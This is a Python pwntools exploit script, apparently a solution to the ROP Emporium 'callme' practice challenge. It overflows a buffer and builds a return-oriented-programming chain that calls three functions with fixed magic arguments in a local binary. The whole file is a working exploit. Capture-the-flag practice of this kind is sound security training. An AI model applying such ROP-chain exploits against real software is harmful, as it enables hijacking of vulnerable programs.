from pwn import *
context.bits=64

overwrite = b"A"*40

callmel = p64(0x0000000000400720)
callme2 = p64(0x0000000000400740)
callme3 = p64(0x00000000004006f0)

pop3ret = p64(0x000000000040093C)
gadget_ret = p64(0x00000000004006be)

deadbeef = p64(0xdeadbeefdeadbeef)
cafebeef = p64(0xcafebabecafebabe)
doodfood = p64(0xd00df00dd00df00d)

arguments = deadbeef + cafebeef + doodfood

payload = overwrite + gadget_ret + pop3ret + arguments + callmel
payload += pop3ret + arguments + callme2
payload += pop3ret + arguments + callme3

p = process("./callme")
p.sendline(payload)
p.interactive()
